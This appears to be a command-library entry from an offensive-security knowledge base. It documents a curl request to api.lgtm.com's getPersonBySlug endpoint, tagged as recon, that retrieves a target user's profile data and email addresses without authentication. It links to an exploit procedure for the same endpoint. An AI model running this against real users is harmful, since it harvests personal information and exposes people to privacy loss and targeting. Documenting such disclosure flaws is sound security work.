---
data: 'curl -X GET "https://api.lgtm.com/person/{slug}" -H "Accept: application/json"'
tags:
  - api-testing
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.392Z'
id: 9b93833d-d3dd-4b2c-abc2-5b737c015235
verified: false
validated: true
submitted: true
---
# curl-api-call

## Command

```bash
curl -X GET "https://api.lgtm.com/person/{slug}" -H "Accept: application/json"
```

## Description

This command performs an unauthenticated GET request to the getPersonBySlug API endpoint to retrieve user profile data, including potential email addresses, by replacing {slug} with a target user's identifier.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `"https://api.lgtm.com/person/{slug}"` | API URL with user slug placeholder | Yes |
| `-H "Accept: application/json"` | Requests JSON response format | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.lgtm.com/person/example-slug" -H "Accept: application/json"
```

### Advanced Usage

```bash
curl -X GET "https://api.lgtm.com/person/example-slug" -H "Accept: application/json" -v -o response.json
```

## Expected Output

JSON object with user data, such as {"email": "user@example.com", "name": "Example User"}, indicating successful disclosure if email is present.

## Related

- [[Related Procedure|procedures/Exploit-getPersonBySlug-to-Retrieve-Email]]
